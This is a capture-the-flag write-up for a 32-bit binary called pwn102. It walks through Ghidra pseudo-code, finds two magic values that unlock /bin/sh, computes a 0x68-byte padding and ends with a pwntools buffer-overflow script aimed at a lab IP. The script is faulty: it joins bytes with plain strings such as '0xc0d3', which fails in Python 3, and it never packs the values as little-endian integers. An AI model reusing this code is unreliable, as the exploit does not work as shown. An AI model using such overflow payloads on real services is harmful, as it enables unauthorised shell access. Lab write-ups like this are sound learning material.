## Intro:
This is also a buffer overflow attack but in this case we need to modify the values to achieve a buffer overflow.

Failure:<img width="1106" height="213" alt="image" src="https://github.com/user-attachments/assets/1e763350-8040-486a-81ea-c896b6eee8e4" />

Lets dissassemble and reverse engineer this binary, I am using ghidra for this challenge.

This is the pseudo-code of the main function

<img width="542" height="533" alt="image" src="https://github.com/user-attachments/assets/2dd8aab7-7b3e-4a10-9235-154e101cdd82" />

## Psudo-Code Analysis

Where we can see the if condition has 2 equal conditions `0xc0ff33` and `0xc0d3` if they are satisfied we will into the /bin/sh which is the shell.

But there is only one scanf function for accepting input from the user plus the LSB(Little endian) and 32-bit executeable which means we need to write a custom script for the challenge to pwn it.

## Solution:
Lets do a quick math finding the padding for the input 

<img width="206" height="58" alt="image" src="https://github.com/user-attachments/assets/b1268c3a-5d22-463f-9ad2-10928f2bfea5" />

where we need to subtrac the `local_78` variable with `local_10` (they are in hex)

So lets subtract them in hexadecimal

<img width="530" height="224" alt="image" src="https://github.com/user-attachments/assets/0e76e6e5-c5b7-42bd-964a-4b20feb384b0" />

we get 68.

So lets write a simple script for thie challenge 

## Script:
```
from pwn import *

context.binary = binary = './pwn102.pwn102'

payload = b'A'*0x68 + '0xc0d3' + '0xc0ff33'

p = remote("10.201.127.254",9002)
p.recv()
p.sendline(payload)
p.interactive()
```

